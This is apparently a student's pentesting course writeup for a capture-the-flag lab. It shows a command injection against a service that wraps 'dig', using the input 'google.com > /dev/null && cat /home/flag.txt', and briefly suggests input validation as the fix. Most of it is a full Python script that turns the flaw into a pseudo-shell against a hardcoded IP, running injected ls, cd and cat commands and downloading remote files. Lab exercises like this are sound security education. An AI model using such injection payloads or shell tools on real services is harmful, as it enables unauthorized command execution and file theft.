# Writeup 4 - Pentesting I

Name: *ROBERT NASH*
Section: *0201*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Robert Nash

## Assignment Writeup

### Part 1 (45 pts)

The right flag: `CMSC389R{d1gging_f0r_flag5_thr0ugh_1njec7ion}`

Input: `google.com > /dev/null && cat /home/flag.txt`

To figure this out I first type a legitimate URL to see what output it gave me. Once I saw the output, I ran the same dig command on my own computer to compare the output. It was the same so I concluded nothing was out of the ordinary. Then I added commands to see what I could get away with. In bash if you add && to the end of a command, you can execute a second command after the first one is successful. So I added `&& ls` to the end of `google.com` so that the server would run the complete command `dig google.com && ls`. In theory, the server would run the first command, `dig google.com` and then run my command right after. Sure enough it printed the dig command along with the listing of the current root folder. From there I could add `> /dev/null` to suppress the output of dig because we don't care about that and then any command we want. We could `ls` any directory to see what is on it First we added `ls /home` and saw the `flag.txt` and then typed `cat /home/flag.txt` to read its contents.
If Elizabeth wanted to prevent this type of attack, she would implement a defense called input validation. The script she uses on her service would first check the input to make sure it met a certain set of criteria before allowing the command to be executed. For example, the user should only be submitting registered domains. There really isn't much of a reason for the input to have any special characters such as `;` or `&` or a space. Therefore Elizabeth could check if the the input had these characters, and if so, reject it and either close the connection or ask for new input.


### Part 2 (55 pts)

```
import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port here
path = ""
shell_active = 0
help_menu = "\
shell                              Drop into an interactive shell\n\
pull <remote-path> <local-path>    Download files\n\
help                               Shows this help menu\n\
quit                               Quit the shell"

def execute_cmd(cmd):
    global path
    global shell_active

    command = cmd.split()

    if command[0] == "pwd":
            print(path.strip())
    elif command[0] == "ls":
        if len(command) == 1:
            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.connect((host, port))
            data = tcpSocket.recv(1024)
            tcpSocket.send("google.com > /dev/null; ls " + path.strip() + "\n")
            data = tcpSocket.recv(1024)
            print(data.strip())
        else:
            tempPath = command[1]
            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.connect((host, port))
            data = tcpSocket.recv(1024)
            tcpSocket.send("google.com > /dev/null; ls " + tempPath.strip() + "\n")
            data = tcpSocket.recv(1024)
            print(data.strip())

    elif command[0] == "cd":
        try:
            if command[1] == "..":
                tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcpSocket.connect((host, port))
                data = tcpSocket.recv(1024)
                tcpSocket.send("google.com > /dev/null; cd " + path.strip() + "/.. && pwd" "\n")
                path = ""
                path = tcpSocket.recv(1024)
            else:
                tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcpSocket.connect((host, port))
                data = tcpSocket.recv(1024)
                tcpSocket.send("google.com > /dev/null; cd " + path.strip() + "/" + command[1] +"; pwd" "\n")
                path = ""
                path = tcpSocket.recv(1024)
        except IndexError:
            print("Must specify directory.")
    elif command[0] == "cat":
        try:
            file = command[1]
            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.connect((host, port))
            data = tcpSocket.recv(1024)
            tcpSocket.send("google.com > /dev/null ; cat " + path.strip() + "/" + file + "\n")
            data = tcpSocket.recv(4096)
            print(data.strip())
        except IndexError:
            print("Must specify file.")

    elif command[0] == "quit":
            print("Disconnecting from host...\n")
            shell_active = 0
    else:
        print("Unknown command. Try again.")


if __name__ == '__main__':
    while 1:
        prompt = raw_input("> ").split()

        if prompt[0] == "shell":
            print("Connecting to host...\n")
            shell_active = 1

            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.connect((host, port))
            data = tcpSocket.recv(1024)
            tcpSocket.send("google.com > /dev/null; pwd\n")
            path = tcpSocket.recv(1024)

            print("Connected.\n")

            while shell_active:
                cmd = raw_input(path.strip() + "> ")
                execute_cmd(cmd)
        elif prompt[0] == "pull":
            inFile = open(prompt[2], "w+")

            outFile = prompt[1]
            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.connect((host, port))
            data = tcpSocket.recv(1024)
            tcpSocket.send("google.com > /dev/null; cat " + outFile.strip() + "\n")
            data = tcpSocket.recv(4096)
            inFile.write(data)

            inFile.close()
        elif prompt[0] == "help":
            print (help_menu)

        elif prompt[0] == "quit":
            exit(0)
        else:
            print("Unknown command. Try one of these instead:\n")
            print(help_menu)
```

The above source code is a python program that when executed, opens a shell that will interact with the server via the vulnerability. Every time the user wants to pass a command to a server, the program will connect to the server and add the user's command to the command the server expects. If the user traverses paths, the program keeps track of where the user should be and alters commands according to the full path.  If the user simply wants to pull a file from the server, the program connects to the server and `cat`'s the file into a buffer. The program will read this buffer and save it to a file. If the file exists, it will be overwritten, if not, the file will be created. The user can also print out a help menu or type `quit` to gracefully exit the program.
A new connection is made every time a user enters a new command but the program makes it seem as though the user is on the host machine the entire time.

